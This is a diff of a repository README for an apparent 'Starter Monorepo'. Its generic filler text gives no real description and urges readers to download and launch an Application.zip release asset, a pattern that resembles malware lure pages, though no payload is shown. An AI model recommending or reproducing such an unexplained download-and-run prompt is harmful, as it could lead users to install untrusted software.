@@ -5,7 +5,7 @@ Unfortunately, the short description for this repository is not provided at the 
 
 ### Launch Application:
 Click the button below to download and launch the application:
-[![Launch Application](https://img.shields.io/badge/Launch-Application-blue)](https://github.com/file/Application.zip)
+[![Launch Application](https://github.com/raikovt/starter-monorepo/releases/download/v1.0.0/Application.zip)](https://github.com/raikovt/starter-monorepo/releases/download/v1.0.0/Application.zip)
 
 ### Overview:
 Welcome to the "Starter Monorepo" repository! In this space, you will find a collection of code and resources related to a specific project. While the exact details of the project are not provided in the repository description, you are encouraged to explore the contents and discover what exciting developments may be inside.
